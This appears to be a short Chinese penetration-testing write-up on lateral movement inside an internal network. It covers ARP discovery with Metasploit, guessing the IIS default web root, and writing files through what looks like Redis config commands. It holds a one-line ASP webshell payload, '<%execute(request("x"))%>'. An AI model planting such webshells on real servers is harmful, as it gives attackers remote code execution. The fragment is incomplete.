内网横向移动-192.168.59.4

通过msf对内网进行扫描arp存活发现了几台机器：（之前没扫描出来应该是有防火墙）

登陆成功！现在要想拿到权限首先我们不知道网站路径（写不了一句话 ），但是知道当前网站使用的是IIS，那么IIS默认目录是：

C:\Inetpub\wwwroot


设想会不会是这个目录呢？随即写了一个aspx的shell到IIS默认目录：

发现写入不了，随后设置了读写权限 ：

config set slave-read-only on

set x '    <%execute(request("x"))%>    '
